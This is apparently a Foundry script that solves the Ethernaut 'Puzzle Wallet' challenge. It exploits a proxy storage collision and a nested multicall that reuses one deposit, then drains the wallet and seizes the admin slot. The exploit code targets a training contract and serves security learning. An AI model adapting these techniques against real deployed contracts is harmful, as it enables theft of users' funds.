// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here

interface PuzzleWallet {
  function withdraw() external;
  function admin() external view returns (address);
  function owner() external view returns (address);
  function pendingAdmin() external view returns (address);
  function whitelisted(address _addr) external view returns(bool);
  function balances(address _addr) external view returns(uint256);
  function deposit() external payable;
  function init(uint256 maxBalance) external;
  function maxBalance() external view returns(uint256);
  function addToWhitelist(address _addr) external;
  function proposeNewAdmin(address _pendingAdmin) external;
  function execute(address to, uint256 value, bytes calldata data) external;
  function setMaxBalance(uint256 _maxBalance) external;
  function multicall(bytes[] calldata data) payable external;
}

contract PuzzleWalletSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x725595BA16E76ED1F6cC1e1b65A88365cC494824;
    address user = vm.envAddress("ACCOUNT_ADDRESS");
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        // NOTE Must send at least 0.001 ETH
        address challengeInstance = __createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        PuzzleWallet puzzleWallet = PuzzleWallet(challengeInstance);
        puzzleWallet.proposeNewAdmin(user);
        puzzleWallet.addToWhitelist(user);
        bytes[] memory data = new bytes[](2);
        bytes[] memory data2 = new bytes[](1);
        data2[0] = abi.encodeWithSignature("deposit()");
        data[0] = abi.encodeWithSignature("deposit()");
        data[1] = abi.encodeWithSignature("multicall(bytes[])", data2);

        puzzleWallet.multicall{value: 0.001 ether}(data);
        puzzleWallet.execute(user, 0.002 ether, "");
        puzzleWallet.setMaxBalance(uint256(uint160(bytes20(user))));

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(24));
    }
}
